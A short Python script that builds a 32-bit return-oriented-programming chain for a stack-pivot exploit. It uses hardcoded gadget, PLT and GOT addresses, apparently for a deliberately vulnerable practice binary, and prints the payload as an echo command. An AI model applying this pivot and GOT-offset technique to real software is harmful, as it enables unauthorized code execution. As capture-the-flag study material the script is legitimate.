#!/usr/bin/python3

WORD = 4

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, WORD)
PACKS = lambda s: bytes(s + (((len(s) & ~(WORD - 1)) + WORD) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

POP_EAX = 0x0804882c
POP_EBX = 0x080488b6

XCHG_EAX_ESP = 0x0804882e
DEREF_EAX = 0x08048830
ADD_EAX_EBX = 0x08048833

CALL_EAX = 0x080485f0

FOOTHOLD_GOT = 0x0804a024
FOOTHOLD_PLT = 0x08048520

OFFSET = 0x00000974 - 0x0000077d

import sys

# send with a fifo outputting to the binary and replace ADDR with the pivot location
ADDR = 0x0

# ./exploit ROP   for the ropchain
# ./exploit       after getting the address

if len(sys.argv) > 1 and sys.argv[1] == "ROP":
    rop = PACKP(FOOTHOLD_PLT)
    rop += PACKP(POP_EAX) + PACKP(FOOTHOLD_GOT)
    rop += PACKP(DEREF_EAX)
    rop += PACKP(POP_EBX) + PACKP(OFFSET)
    rop += PACKP(ADD_EAX_EBX)
    rop += PACKP(CALL_EAX)
else:
    rop = b" " * 44
    rop += PACKP(POP_EAX) + PACKP(ADDR) + PACKP(XCHG_EAX_ESP)


echo(rop)
